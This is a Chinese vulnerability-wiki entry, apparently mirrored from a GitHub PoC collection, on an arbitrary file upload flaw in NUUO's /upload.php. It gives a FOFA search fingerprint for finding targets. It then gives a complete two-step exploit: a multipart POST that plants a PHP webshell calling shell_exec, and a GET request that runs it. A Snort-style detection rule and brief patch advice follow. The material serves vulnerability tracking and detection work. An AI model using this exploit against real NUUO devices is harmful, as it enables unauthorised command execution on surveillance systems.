---
schema_version: "1"
id: "VW-20261117-b80bacab7482"
title: "nuuo-upload-文件上传"
product: "NUUO"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
identifier_role: "unknown"
version: "当前已发所有版本"
prerequisites: "来源未完整说明认证/角色/配置前提；不假定匿名可达；FOFA 指纹已在原文"
side_effects: "上传/写文件"
source: "SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC/blob/main/2026/11/nuuo-upload-文件上传/nuuo-upload-文件上传.md"
---

<!-- vulwiki-editorial:start -->
## 校订与适用边界

### 本次收录记录
- 2026-11-17 周维护收录：来源 SourByte05/Vulnerability-Wiki-PoC；文本全文审阅完成；未执行任何 PoC、依赖安装或目标访问。
- 触发材料（请求/指纹/规则）保留在下方原文中，未做脱敏或删改。
- CVE/产品查重：无重复主入口（本库 master 6314 篇正文级搜索无既有条目）

### 尚未解决的证据缺口
- 影响版本为来源声明，未与厂商公告逐一核对
- 复现截图像素未查看，技术结论以原文文字为准
- 修复状态为来源声明，需按分支核对补丁版本
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

> 以下为来源原文全文（保留原始字节，含广告与联系方式的保留原文）。

# nuuo-upload-文件上传

nuuo-upload-文件上传

# 影响版本

当前已发所有版本

# **漏洞状态**

|**漏洞细节**|**漏洞POC**|**漏洞EXP**|**在野利用**|
| :-: | :-: | :-: | :-: |
|**是**|**已公开**|**已公开**|**已知**|

## 风险等级

|**维度**|**评价**|
| :-: | :-: |
|**威胁等级**|**高危**|
|**影响面**|**广**|
|**攻击者价值**|**高**|
|**利用难度**|**低**|

# 漏洞复现

**fofa:**   body="NUUO"

**POC/EXP：**

**step1**  文件上传

```
POST /upload.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7s9KfD2gX8cR4nZ1

------WebKitFormBoundary7s9KfD2gX8cR4nZ1
Content-Disposition: form-data; name="userfile"; filename="3LaIDUgRKkIxtHHR4RVAJ5GJrgM.php"
Content-Type: application/octet-stream

<?php echo '3232'; echo shell_exec('ifconfig'); ?>
------WebKitFormBoundary7s9KfD2gX8cR4nZ1--
```

![image](../../../.resource/remote/.resource/remote/4195a1519e69163d67fda479fefc3f36078467b4f2897e83a518b553f558a5ce.png)

**step2**  验证

```
GET /3LaIDUgRKkIxtHHR4RVAJ5GJrgM.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36


```

![image](../../../.resource/remote/.resource/remote/beb37580389970a4369e3ea1b5f8e9be43e65c68118ab7a19335e7d467c827cf.png)

**sonrt规则：**

```
alert http any any -> $HOME_NET any (
    msg:"NUUO - /upload.php 任意文件上传漏洞 (上传php webshell)";
    flow:to_server,established;
    http.method; content:"POST";
    http.uri;
        content:"/upload.php";
        fast_pattern;
    http.content_type; content:"multipart/form-data"; nocase;
    http.request_body;
        content:"name=|22|userfile|22|"; nocase;
        content:"filename="; nocase; distance:0; within:100;
        content:".php"; nocase; distance:0; within:100;
        content:"<?php"; nocase; distance:0; within:300;
        content:"shell_exec"; nocase; distance:0; within:300;
    metadata:
        service http,
        affected_product "NUUO",
        vulnerability_type "Arbitrary File Upload",
        severity "critical";
    classtype:web-application-attack;
    sid:1000813;
    rev:1;
    priority:1;
)
```

# 漏洞修复

#### 官方修复

- **升级至安全版本**：联系官方获取针对该漏洞的安全补丁或升级版本。

---

> 来源：SourByte05/Vulnerability-Wiki-PoC（原文见文首链接，归档 URL 见 frontmatter source_url）